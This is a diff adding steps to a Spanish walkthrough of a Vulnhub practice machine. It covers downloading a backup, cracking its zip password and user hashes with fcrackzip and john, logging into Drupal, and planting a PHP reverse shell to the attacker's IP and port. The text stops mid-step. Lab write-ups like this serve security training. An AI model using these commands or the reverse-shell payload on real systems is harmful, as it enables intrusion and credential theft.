@@ -17,4 +17,32 @@ Walkthrough Máquina RootThis Vulnhub
  - /drupal/
  - /manual
  - /server-status
-9. 
+9. Ahora vamos a tratar de obtener el backup que hemos descubierto con dirb:
+ - wget http://IP_victima/backup
+10. Vamos a averiguar que tipo de fichero es el backup dado que no trae ninguna extensión:
+ - file backup
+11. Hemos descubierto que es un fichero zip al intertar descomprimirlo vemos que necesita una contraseña
+para intentar cracker la contraseña vamos a utilizar la herramienta fcrackzip:
+ - fcrackzip -D -v -u -p /usr/share/wordlists/rockyou.txt backup
+12. Nos dice que la contraseña es "thebackup", ahora con unzip descomprimimos el backup.
+ - unzip backup
+13. Vemos que lo que hay en el archivo es un dump sql de toda la base de datos del sitio web, en nuestro
+lo que nos interesa son los usuarios y las contraseñas, así que vamos a buscar la palabra user.
+14. Hemos encontrado dos posibles usuarios:
+ - root:hash
+ - webman:hash
+15. Con esos usuarios y los hashes de sus contraseñas intentamos obtener las contraseñas con john:
+ - john hashes --wordlist=/usr/share/wordlists/rockyou.txt
+16. Obtenemos la contraseña del usuario webman que es: moranguita.
+17. Introducimos las credenciales en el sitio web http://IP_victima/drupal
+18. Como estamos en un gestor de contenidos, nuestro siguiente paso va a ser intertar obtener una shell
+inversa mediante un fichero php.
+19. Para poder subir el archivo php y que se ejecute hemos de realizar los siguientes pasos:
+ - En Modules, hemos de habilitar el modulo PHP Filter.
+ - En los permisos de dicho modulo debemos permitir que el administrador pueda indicar php como un 
+   formato de texto válido.
+ - A continuación, le damos a Add content, e introducimos el siguiente código:
+  · <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");?>
+ - Ese código establecerá una shell inversa a nuestra máquina.
+20. Una vez tenemos la shell inversa, navegamos hasta el directorio /home/user de la víctima y encontramos
+
